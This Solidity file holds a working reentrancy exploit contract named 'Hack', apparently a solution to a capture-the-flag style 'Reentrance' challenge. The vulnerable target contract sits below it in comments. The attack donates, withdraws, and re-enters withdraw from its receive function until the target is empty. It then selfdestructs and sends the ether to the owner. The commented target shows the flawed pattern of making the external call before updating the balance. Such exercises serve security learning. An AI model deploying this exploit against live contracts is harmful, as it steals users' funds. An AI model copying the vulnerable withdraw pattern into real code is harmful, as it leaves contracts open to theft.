// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IRent{
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract Hack{

    address public target;
    address public owner ;

    constructor(address payable _target) payable {
        target = _target;
        owner = msg.sender;
    }


    function attack () external payable {
        IRent(target).donate{value:msg.value}(address(this));
        IRent(target).withdraw(msg.value);

        require(target.balance==0,"bal non 0");
        selfdestruct(payable(owner));
    }

    receive() external payable { 
        // uint amount  = min(msg.value,target.balance); 
        if (target.balance > msg.value){
            IRent(target).withdraw(msg.value);
        }else if(target.balance> 0){
            IRent(target).withdraw(target.balance);
        }
    }

}

// pragma solidity ^0.6.12;

// import 'openzeppelin-contracts-06/math/SafeMath.sol';

// contract Reentrance {
  
//   using SafeMath for uint256;
//   mapping(address => uint) public balances;

//   function donate(address _to) public payable {
//     balances[_to] = balances[_to].add(msg.value);
//   }

//   function balanceOf(address _who) public view returns (uint balance) {
//     return balances[_who];
//   }

//   function withdraw(uint _amount) public {
//     if(balances[msg.sender] >= _amount) {
//       (bool result,) = msg.sender.call{value:_amount}("");
//       if(result) {
//         _amount;
//       }
//       balances[msg.sender] -= _amount;
//     }
//   }

//   receive() external payable {}
// }